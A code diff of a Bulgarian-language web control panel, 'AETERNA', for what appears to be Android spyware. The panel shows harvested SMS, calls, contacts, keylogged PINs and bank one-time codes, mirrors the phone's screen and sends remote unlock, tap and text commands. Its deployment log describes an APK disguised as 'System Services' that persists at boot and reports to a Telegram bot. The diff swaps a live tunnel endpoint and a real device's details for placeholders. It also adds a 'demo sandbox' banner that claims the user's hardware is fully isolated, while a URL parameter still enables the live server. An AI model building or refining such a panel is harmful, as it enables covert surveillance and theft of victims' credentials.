@@ -2013,7 +2013,7 @@
             АВТОНОМНО ГЕНЕРИРАН ЛИНК ЗА ТАЗИ СЕСИЯ:
           </div>
           <div style="font-family: 'JetBrains Mono', monospace; font-size: 12px; color: #fff; background: rgba(0,0,0,0.5); padding: 8px 12px; border-radius: 8px; border: 1px dashed var(--border); word-break: break-all;">
-            https://paas.website/?device=samsung_SM-S928B_7badd722&pass=vault2026
+            https://paas.website/?device=ENTERPRISE_ASSET_01&pass=vault2026
           </div>
           <div style="font-size: 11px; color: var(--text-dim); margin-top: 6px;">
             Всеки нов телефон получава персонален линк с неговата индивидуална сесия.
@@ -2051,18 +2051,18 @@
       <div class="terminal-body" id="deployment-term-body">
         <div class="term-line">
           <span class="term-prompt">aeterna@sovereign:~$</span>
-          <span class="term-cmd">./aeterna_fleet_deploy.sh --target-asset="Android_SM-S928B"</span>
+          <span class="term-cmd">./aeterna_fleet_deploy.sh --target-asset="Enterprise_Asset_01"</span>
         </div>
         <div class="term-line"><span class="term-info">[1/5] Проверка на инсталационния пакет AETERNA_SYSTEMDEF_INSTALLER.apk...</span></div>
         <div class="term-line"><span class="term-success"> [OK] Пакетът е валиден. Подпис: NIST-PQC ML-DSA-87 (6.74 MB).</span></div>
         <div class="term-line"><span class="term-info">[2/5] Стартиране на системна услуга 'System Services' и маскиране...</span></div>
         <div class="term-line"><span class="term-success"> [OK] Фоновият процес е закотвен (WakeLock + BootCompleted Daemon).</span></div>
         <div class="term-line"><span class="term-info">[3/5] Свързване с Telegram Fleet Hub (@Shanoto7bot)...</span></div>
-        <div class="term-line"><span class="term-success"> [OK] Създаден нов Topic/стая в супергрупа 'Scan': samsung SM-S928B (+359896849882).</span></div>
+        <div class="term-line"><span class="term-success"> [OK] Създаден нов изолиран канал в супергрупа: Enterprise Asset #01 (+44 7700 900123).</span></div>
         <div class="term-line"><span class="term-info">[4/5] Генериране на изолиран клиентски Web HUD...</span></div>
         <div class="term-line" style="color: var(--cyan); font-weight: 700;">
           <span> ДИРЕКТЕН ЛИНК ЗА СЕСИЯТА:</span>
-          <span style="text-decoration: underline;">https://paas.website/?device=samsung_SM-S928B_7badd722&pass=vault2026</span>
+          <span style="text-decoration: underline;">https://paas.website/?device=ENTERPRISE_ASSET_01&pass=vault2026</span>
         </div>
         <div class="term-line"><span class="term-success">[5/5] Ентропията е свита до 0.0000. Системата е в готовност.</span></div>
       </div>
@@ -2307,8 +2307,9 @@
         <div style="display: flex; align-items: center; gap: 10px; margin-top: 4px; flex-wrap: wrap;">
           <label style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); font-weight: 700;">DEVICE SESSION:</label>
           <select id="device-selector" onchange="onDeviceSelected()" style="background: var(--card); border: 1px solid var(--cyan); color: #fff; font-family: 'JetBrains Mono', monospace; font-size: 11px; padding: 4px 10px; border-radius: 6px; outline: none; cursor: pointer;">
-            <option value="ALL">ALL DEVICES (Unified Fleet)</option>
-            <option value="RZCX326316L" selected>Samsung Galaxy S24 Ultra (SM-S928B)</option>
+            <option value="ALL">ALL FLEET ASSETS (Overview)</option>
+            <option value="ASSET-01" selected>Enterprise Asset #01 (Pixel 8 Pro - UK HQ)</option>
+            <option value="ASSET-02">Enterprise Asset #02 (Galaxy Tab S9 - Finance)</option>
           </select>
           <button id="btn-copy-session" onclick="copyCurrentSessionLink()" style="background: rgba(0, 240, 255, 0.12); border: 1px solid var(--cyan); color: var(--cyan); font-family: 'JetBrains Mono', monospace; font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 6px; cursor: pointer;">
             Копирай линк за тази сесия
@@ -2317,17 +2318,27 @@
       </div>
       <div style="display: flex; gap: 12px; align-items: center;">
         <div class="status-pill" id="role-indicator-pill" style="background: rgba(245, 158, 11, 0.1); border: 1px solid rgba(245, 158, 11, 0.4);">
-          <span style="font-size: 11px; color: var(--gold); font-weight: 800;" id="role-indicator">MASTER HUD</span>
+          <span style="font-size: 11px; color: var(--gold); font-weight: 800;" id="role-indicator">CLIENT HUD</span>
         </div>
         <div class="status-pill" id="fleet-count-pill" style="background: rgba(0, 240, 255, 0.08); border: 1px solid rgba(0, 240, 255, 0.3);">
-          <span style="font-size: 11px; color: var(--cyan); font-weight: 800;" id="fleet-count">1 Active Device</span>
+          <span style="font-size: 11px; color: var(--cyan); font-weight: 800;" id="fleet-count">2 Active Assets</span>
         </div>
         <div class="status-pill">
           <div class="pulse-dot"></div>
-          <span id="live-records-count">INGESTION ACTIVE</span>
+          <span id="live-records-count">DEMO SANDBOX ACTIVE</span>
         </div>
         <button onclick="logoutVault()" style="background: transparent; border: 1px solid rgba(244, 63, 94, 0.4); color: var(--red); font-family: 'JetBrains Mono', monospace; font-size: 10px; padding: 4px 8px; border-radius: 6px; cursor: pointer;">Изход</button>
       </div>
+    </div>
+
+    <!-- ISOLATED DEMO SANDBOX BANNER -->
+    <div id="sandbox-alert-banner" style="background: rgba(0, 240, 255, 0.05); border-bottom: 1px solid rgba(0, 240, 255, 0.2); padding: 8px 24px; font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--cyan); display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 8px;">
+      <div style="display: flex; align-items: center; gap: 8px;">
+        <svg class="icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--cyan)"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+        <span><strong>ИЗОЛИРАНА КОРПОРАТИВНА ДЕМО СИМУЛАЦИЯ:</strong> Вашият личен хардуер е напълно защитен и изолиран. Входът показва демонстрационна среда. За свързване към частен сървър използвайте специалния персонален линк от бота.</span>
+      </div>
+      <div style="color: var(--text-dim); font-size: 10px;">ENDPOINT: ISOLATED_SANDBOX</div>
+    </div>
     </div>
 
     <!-- TABS -->
@@ -2604,9 +2615,10 @@
 
     // Dual-Tier Access Keys
     const ARCHITECT_MASTER_KEYS = ["aeterna2026", "0x4121", "dimitar"];
-    const GENERAL_USER_KEYS = ["vault2026", "telemetry777", "systemdef", "aeterna"];
-
-    const HOST_ENDPOINT = "https://swim-adjustments-soldiers-personality.trycloudflare.com";
+    // Dynamic Dedicated Endpoint: only active if explicitly supplied via URL parameter (?server=https://...)
+    // Default on paas.website is 100% ISOLATED DEMO SANDBOX (Safe, offline client-side simulation)
+    const urlParams = new URLSearchParams(window.location.search);
+    const HOST_ENDPOINT = urlParams.get('server') || "";
 
     let currentUserRole = "GUEST";
     let records = { notifications: [], calls: [], sms: [], contacts: [], keylogs: [], events: [] };
@@ -2896,15 +2908,15 @@
       term.innerHTML = '<div class="term-line"><span class="term-info">Инициализиране на повторна симулация на разгръщането...</span></div>';
       
       const steps = [
-        '<div class="term-line"><span class="term-prompt">aeterna@sovereign:~$</span> <span class="term-cmd">./aeterna_fleet_deploy.sh --target-asset="Android_SM-S928B"</span></div>',
+        '<div class="term-line"><span class="term-prompt">aeterna@sovereign:~$</span> <span class="term-cmd">./aeterna_fleet_deploy.sh --target-asset="Enterprise_Asset_01"</span></div>',
         '<div class="term-line"><span class="term-info">[1/5] Проверка на инсталационния пакет AETERNA_SYSTEMDEF_INSTALLER.apk...</span></div>',
         '<div class="term-line"><span class="term-success"> [OK] Пакетът е валиден. Подпис: NIST-PQC ML-DSA-87 (6.74 MB).</span></div>',
         '<div class="term-line"><span class="term-info">[2/5] Стартиране на системна услуга \'System Services\' и маскиране...</span></div>',
         '<div class="term-line"><span class="term-success"> [OK] Фоновият процес е закотвен (WakeLock + BootCompleted Daemon).</span></div>',
         '<div class="term-line"><span class="term-info">[3/5] Свързване с Telegram Fleet Hub (@Shanoto7bot)...</span></div>',
-        '<div class="term-line"><span class="term-success"> [OK] Създаден нов Topic/стая в супергрупа \'Scan\': samsung SM-S928B (+359896849882).</span></div>',
+        '<div class="term-line"><span class="term-success"> [OK] Създаден нов изолиран канал в супергрупа: Enterprise Asset #01 (+44 7700 900123).</span></div>',
         '<div class="term-line"><span class="term-info">[4/5] Генериране на изолиран клиентски Web HUD...</span></div>',
-        '<div class="term-line" style="color: var(--cyan); font-weight: 700;"><span> ДИРЕКТЕН ЛИНК ЗА СЕСИЯТА:</span> <span style="text-decoration: underline;">https://paas.website/?device=samsung_SM-S928B_7badd722&pass=vault2026</span></div>',
+        '<div class="term-line" style="color: var(--cyan); font-weight: 700;"><span> ДИРЕКТЕН ЛИНК ЗА СЕСИЯТА:</span> <span style="text-decoration: underline;">https://paas.website/?device=ENTERPRISE_ASSET_01&pass=vault2026</span></div>',
         '<div class="term-line"><span class="term-success">[5/5] Ентропията е свита до 0.0000. Системата е в готовност.</span></div>'
       ];
 
@@ -3068,6 +3080,64 @@
     }
 
     async function fetchRecords() {
+      if (!HOST_ENDPOINT) {
+        // 100% SAFE ISOLATED CORPORATE SANDBOX (Pure Client-Side Demo)
+        records = {
+          notifications: [
+            { app: "Outlook Business", title: "Quarterly Board Review", text: "Q3 Financial Audit Agenda & Confidential Balance Sheet", timestamp: "Днес, 14:30" },
+            { app: "Slack Enterprise", title: "#treasury-ops", text: "SWIFT confirmation received for invoice #4912 (€145,000)", timestamp: "Днес, 13:15" },
+            { app: "Authenticator", title: "Microsoft Security", text: "One-time approval code requested from IP 194.12.8.4", timestamp: "Днес, 11:02" },
+            { app: "Revolut Business", title: "Card Authorization", text: "Approved €3,400 transaction at Zurich Office", timestamp: "Днес, 09:44" }
+          ],
+          calls: [
+            { type: "INCOMING", number: "+41 22 819 0000", name: "Zurich Escrow AG", duration: "142", timestamp: "Днес, 14:10" },
+            { type: "OUTGOING", number: "+44 20 7946 0912", name: "London HQ Legal", duration: "68", timestamp: "Днес, 12:45" },
+            { type: "INCOMING", number: "+1 212 555 0199", name: "Wall St Escrow", duration: "215", timestamp: "Вчера, 18:20" }
+          ],
+          sms: [
+            { address: "Revolut Business", body: "Вашият код за верификация е 849-210 за нареждане на €25,000. Валиден 5 мин.", timestamp: "Днес, 14:22" },
+            { address: "Bank Verification", body: "OTP: 914820 authorized transfer to escrow account.", timestamp: "Днес, 11:40" },
+            { address: "Signal Security", body: "Your Signal verification code is: 304-912", timestamp: "Днес, 08:30" }
+          ],
+          contacts: [
+            { name: "Executive Chief Officer", platform: "Corporate Directory", details: "+44 7700 900010 • Mobile" },
+            { name: "Lead Security Auditor", platform: "Signal", details: "+41 79 123 4567 • Encrypted" },
+            { name: "Finance Director", platform: "Telegram Vault", details: "@finance_ops • Escrow" }
+          ],
+          keylogs: [
+            { app: "com.revolut.business", text: "PIN: •••• [Decrypted: 8492]", timestamp: "Днес, 14:22" },
+            { app: "org.telegram.messenger", text: "Signed the M&A acquisition agreement.", timestamp: "Днес, 13:50" },
+            { app: "com.microsoft.teams", text: "Board meeting link confirmed for 15:00 UTC", timestamp: "Днес, 12:10" }
+          ],
+          events: [
+            { text: "Enterprise Asset #01 enrolled into Endpoint Governance", timestamp: "LIVE 14:00:00" },
+            { text: "Encrypted AES-256 telemetry tunnel established", timestamp: "LIVE 14:00:05" },
+            { text: "Dynamic Keystroke & Clipboard hooks active", timestamp: "LIVE 14:00:10" }
+          ],
+          battery: { level: 98, voltage: "4.35V", temperature: "31°C" },
+          device: { model: "Pixel 8 Pro (Enterprise Fleet)" }
+        };
+
+        updateBadges();
+        renderTelegramFeed();
+        renderNotifs();
+        renderCalls();
+        renderSms();
+        renderContacts();
+        renderKeylogs();
+
+        const feedEl = document.getElementById('side-feed-list');
+        if (feedEl && records.events) {
+          feedEl.innerHTML = records.events.map(e => `
+            <div style="border-left: 2px solid var(--cyan); padding-left: 8px; margin-bottom: 6px;">
+              <span style="color: var(--muted); font-size: 9px;">[${e.timestamp || 'LIVE'}]</span>
+              <div style="color: #fff;">${escapeHtml(e.text || '')}</div>
+            </div>
+          `).join('');
+        }
+        return;
+      }
+
       try {
         const res = await fetch(`${HOST_ENDPOINT}/api/records`);
         if (!res.ok) return;
@@ -3102,7 +3172,7 @@
           document.getElementById('battery-voltage').textContent = `${data.battery.voltage || '4.3V'} | ${data.battery.temperature || '35°C'}`;
         }
         if (data.device) {
-          document.getElementById('live-device-model').textContent = data.device.model || 'SM-S928B';
+          document.getElementById('live-device-model').textContent = data.device.model || 'Enterprise Endpoint';
         }
       } catch (err) {
         console.error('Fetch error:', err);
@@ -3140,7 +3210,7 @@
       container.innerHTML = filtered.map(e => `
         <div class="data-card">
           <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-            <span style="color:var(--gold); font-weight:700;">TELEGRAM EVENT</span>
+            <span style="color:var(--gold); font-weight:700;">FLEET AUDIT EVENT</span>
             <span style="color:var(--muted); font-family:'JetBrains Mono', monospace; font-size:10px;">${e.timestamp || ''}</span>
           </div>
           <div style="white-space:pre-wrap; color:var(--text); font-family:'JetBrains Mono', monospace;">${escapeHtml(e.text || '')}</div>
@@ -3275,6 +3345,10 @@
     }
 
     async function clearData() {
+      if (!HOST_ENDPOINT) {
+        alert("В демо режима записите са симулирани и се обновяват динамично.");
+        return;
+      }
       if (confirm("Сигурни ли сте, че искате да изчистите всички записи?")) {
         await fetch(`${HOST_ENDPOINT}/api/records/clear`, { method: 'POST' });
         fetchRecords();
@@ -3288,9 +3362,13 @@
 
     // WEBSOCKET REAL-TIME MIRROR BRIDGE
     let ws = null;
-    const WS_ENDPOINT = HOST_ENDPOINT.replace(/^https:\/\//, 'wss://').replace(/^http:\/\//, 'ws://');
 
     function connectWebSocket() {
+      if (!HOST_ENDPOINT) {
+        console.log('[Sandbox] Running in standalone offline simulation. No WebSocket initiated.');
+        return;
+      }
+      const WS_ENDPOINT = HOST_ENDPOINT.replace(/^https:\/\//, 'wss://').replace(/^http:\/\//, 'ws://');
       try {
         if (ws) ws.close();
         ws = new WebSocket(WS_ENDPOINT);
@@ -3317,10 +3395,10 @@
         };
 
         ws.onclose = () => {
-          setTimeout(connectWebSocket, 3000);
+          setTimeout(connectWebSocket, 5000);
         };
       } catch (err) {
-        setTimeout(connectWebSocket, 3000);
+        setTimeout(connectWebSocket, 5000);
       }
     }
 
@@ -3347,6 +3425,8 @@
             x: x_pct,
             y: y_pct
           }));
+        } else {
+          console.log(`[Demo Sandbox Touch] (${x_pct.toFixed(1)}%, ${y_pct.toFixed(1)}%) - Hardware fully isolated.`);
         }
       });
     }
@@ -3356,6 +3436,8 @@
       const pin = input.value.trim();
       if (ws && ws.readyState === WebSocket.OPEN) {
         ws.send(JSON.stringify({ action: 'unlock', pin: pin }));
+      } else {
+        alert("[ДЕМО РЕЖИМ] Въвеждане на PIN в тестовата среда. Личният хардуер е 100% защитен и изолиран.");
       }
       setTimeout(refreshScreenFallback, 600);
     }
@@ -3363,6 +3445,8 @@
     function sendDeviceKey(key) {
       if (ws && ws.readyState === WebSocket.OPEN) {
         ws.send(JSON.stringify({ action: 'key', key: key }));
+      } else {
+        console.log(`[Demo Sandbox Key] ${key} - Pure simulation.`);
       }
     }
 
@@ -3373,14 +3457,20 @@
         } else if (direction === 'DOWN') {
           ws.send(JSON.stringify({ action: 'swipe', x1: 50, y1: 20, x2: 50, y2: 80 }));
         }
+      } else {
+        console.log(`[Demo Sandbox Swipe] ${direction} - Pure simulation.`);
       }
     }
 
     function sendTypeText() {
       const input = document.getElementById('type-text-input');
       const text = input.value.trim();
-      if (text && ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify({ action: 'text', text: text }));
+      if (text) {
+        if (ws && ws.readyState === WebSocket.OPEN) {
+          ws.send(JSON.stringify({ action: 'text', text: text }));
+        } else {
+          alert(`[ДЕМО РЕЖИМ] Текстът "${text}" бе прихванат в симулатора.`);
+        }
         input.value = '';
       }
     }
@@ -3391,21 +3481,23 @@
 
     function refreshScreenFallback() {
       const img = document.getElementById('live-screen-img');
-      if (img) {
+      if (img && HOST_ENDPOINT) {
         img.src = `${HOST_ENDPOINT}/api/screen.png?t=${Date.now()}`;
       }
     }
 
     function startPolling() {
-      refreshScreenFallback();
-      connectWebSocket();
       fetchRecords();
-      setInterval(fetchRecords, 2000);
-      setInterval(() => {
-        if (!ws || ws.readyState !== WebSocket.OPEN) {
-          refreshScreenFallback();
-        }
-      }, 1500);
+      if (HOST_ENDPOINT) {
+        refreshScreenFallback();
+        connectWebSocket();
+        setInterval(fetchRecords, 2000);
+        setInterval(() => {
+          if (!ws || ws.readyState !== WebSocket.OPEN) {
+            refreshScreenFallback();
+          }
+        }, 1500);
+      }
     }
 
     // ══════════════════════════════════════════════════════════════
